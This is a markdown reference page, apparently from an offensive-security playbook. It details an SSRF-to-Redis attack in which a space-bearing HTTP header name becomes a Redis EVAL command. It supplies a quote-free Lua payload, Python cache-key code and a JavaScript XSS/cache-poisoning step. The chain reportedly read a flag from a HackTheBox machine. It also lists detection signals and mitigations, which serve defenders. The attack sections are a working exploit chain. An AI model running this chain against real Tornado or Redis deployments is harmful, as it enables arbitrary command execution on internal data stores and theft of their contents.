# SSRF — Redis Inline-Command Injection via Forwarded HTTP Header Name

## When this applies

- The SSRF sink forwards user-controlled HTTP header *names* to an internal Redis instance via an HTTP client (Tornado/Python `simple_httpclient`, similar). Pattern:
  ```python
  headers = {}
  for key in self.request.arguments:
      if key != "url":
          headers[key] = self.get_argument(key)
  http_client.fetch(url, headers=headers, ...)
  ```
- The SSRF target can be `http://<host>:6379/` (Redis).
- Redis is version 6+ (has the `POST`/`Host:` security filter — but custom headers placed *before* the auto-added `Host:` line are still processed).
- Need a way to make the FIRST TOKEN of one HTTP header line be a valid Redis command — usually impossible because every header line is `<Name>: <Value>` and the first token always ends in `:`.

## Technique

**Inject a header *name* that contains whitespace.** When Tornado writes the request, the line becomes `<Name>: <Value>\r\n` — but if `<Name>` is `eval <script> 0 dummy`, the line is `Eval <script> 0 dummy: <Value>\r\n`. Redis tokenizes on whitespace:

| Token # | Value |
|---|---|
| 1 | `Eval` |
| 2 | `<script>` |
| 3 | `0` |
| 4 | `dummy:` |
| 5 | `<Value>` |

That's a well-formed `EVAL <script> <numkeys> [ARGV...]` inline command. `numkeys=0`, `ARGV[1]="dummy:"`, `ARGV[2]="<Value>"` (not used by the script). Redis executes the Lua chunk before subsequent lines (including the auto-added `Host: ` line that would normally terminate the connection).

Tornado normalises the header name via `_normalize_name = "-".join([w.capitalize() for w in name.split("-")])`. **No hyphens** → `.capitalize()` runs once on the whole string — only the first letter is forced to upper-case, everything else lower-cased. That's fine because Redis commands are case-insensitive (`eval` == `EVAL`), and Lua identifiers (`redis`, `call`, `string`, `char`, `cjson`, `encode`) are already lower-case.

### Lua payload: build strings without quotes

Redis inline-protocol parsing rejects quoted strings with `Protocol error: unbalanced quotes in request`. To stay clear of that, build every Lua string via `string.char(<ASCII bytes>)`:

```lua
-- equivalent to: redis.call("set", "<key>", cjson.encode({body=redis.call("get","FLAG"),status_code=200}))
redis.call(
  string.char(115,101,116),                               -- "set"
  string.char(<ASCII bytes of the target cache key>),     -- the SHA-256 hex of the URL you'll read
  cjson.encode({
    body=redis.call(
      string.char(103,101,116),                           -- "get"
      string.char(70,76,65,71)),                          -- "FLAG"
    status_code=200
  })
)
```

The whole script is one whitespace-free token, so it sits in token #2 of the inline command.

## Steps

### 1. Compute the SHA-256 of the leak URL

The CDN keys its cache on `sha256(req.URL.String())`. Pick a URL (e.g., `/pwn`) you'll read later:

```python
import hashlib
LEAK_KEY = hashlib.sha256(b"/pwn").hexdigest()
LEAK_KEY_CODES = ",".join(str(ord(c)) for c in LEAK_KEY)
```

### 2. Build the XSS payload (via cache poisoning on a reflected sink)

Cache-poison some URL the admin bot will visit. The XSS submits a `application/x-www-form-urlencoded` POST to `/panel` whose body has two fields: `url=http://127.0.0.1:6379/` and the crafted EVAL field name:

```javascript
s = String.fromCharCode(32);                                          // a literal space
h = 'eval' + s + '<lua_script>' + s + '0' + s + 'dummy';              // the magic field NAME
p = new URLSearchParams();
p.append('url', 'http://127.0.0.1:6379/');
p.append(h, '');                                                       // value irrelevant
fetch('/panel', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:p});
```

`URLSearchParams` URL-encodes spaces as `+`, which the Tornado backend URL-decodes back to spaces. The space-bearing name reaches the SSRF sink intact.

### 3. Tornado writes the header

After `.capitalize()`, the header line goes out as `Eval <script> 0 dummy: <value>\r\n`. Order matters — Tornado emits user headers *before* `Host:`, so Redis sees the EVAL line first.

### 4. Read the planted cache value

After the Lua runs, the cache entry at `sha256("/pwn")` contains `{"body":"HTB{...}","status_code":200}`. The CDN's default render path JSON-unmarshals this and writes `body` to the response. `GET /pwn` returns the FLAG.

## Detection signals

- SSRF sink iterates `request.arguments` (or any user-controlled key-set) and dumps each into outgoing headers without name validation.
- Outbound client is Tornado `simple_httpclient` (auto-Host appended *after* user headers) — or any client whose header-write loop sends user headers before built-in ones.
- Internal Redis reachable at a fixed `localhost:<port>` from the sink.
- The sink also caches GETs by URL only (so the attacker can plant a payload at a predictable cache key).

## Mitigations

- **Validate header names** before forwarding — reject names that contain whitespace, control chars, or anything other than RFC-7230 `tchar`. (Tornado does *not* do this in `HTTPHeaders._normalize_name`; the framework expects callers to filter.)
- **Don't expose Redis on a localhost port reachable from the SSRF sink** — at minimum require AUTH, or use a Unix-domain socket with restrictive perms.
- **Disable `EVAL` and `cjson`** in production Redis via `rename-command EVAL ""` if Lua isn't needed.
- **At the CDN layer**, include a normalized hash of the request body in the cache key, or refuse to forward bodies on GET — closes the cache-poisoning primitive that brings the XSS into the bot's session.

## Anti-Patterns

- "We strip `\r\n` from header values" — that doesn't help here. The injection is in the *name* token boundary (whitespace), not in CRLF.
- "Redis blocks HTTP-like clients via the `POST`/`Host:` filter" — yes for `POST`, but the filter doesn't fire on `GET`-based clients, and Tornado emits `Host:` *after* the attacker's headers. The Lua executes before Redis terminates the connection.
- Assuming `.capitalize()` makes the payload unusable — Redis commands are case-insensitive (`eval` matches `EVAL`), and Lua identifiers are already lower-case.

## Relation to other patterns

- [protocol-exploitation-gopher.md](protocol-exploitation-gopher.md) covers the classic gopher/file/dict/jar Redis attacks for SSRF sinks that accept non-HTTP schemes. This one is the *HTTP-only* sibling: when the sink is locked to `http://` and the standard cross-protocol tricks fail.
- [cache/poisoning-body-args.md](../../../../web-app-logic/reference/scenarios/cache/poisoning-body-args.md) is usually the upstream primitive — the cache poisoning step that lets you plant the XSS that triggers this SSRF.
- [cache/poisoning-setnx-race.md](../../../../web-app-logic/reference/scenarios/cache/poisoning-setnx-race.md) is the typical glue when the CDN fills cache with `SetNX` — you need to beat the legitimate bot/admin to the cache key before this SSRF chain can fire.
- Confirmed end-to-end against HTB SocratesPanel (Tornado 6.4.2 + Go CDN + Redis 7.0.15).
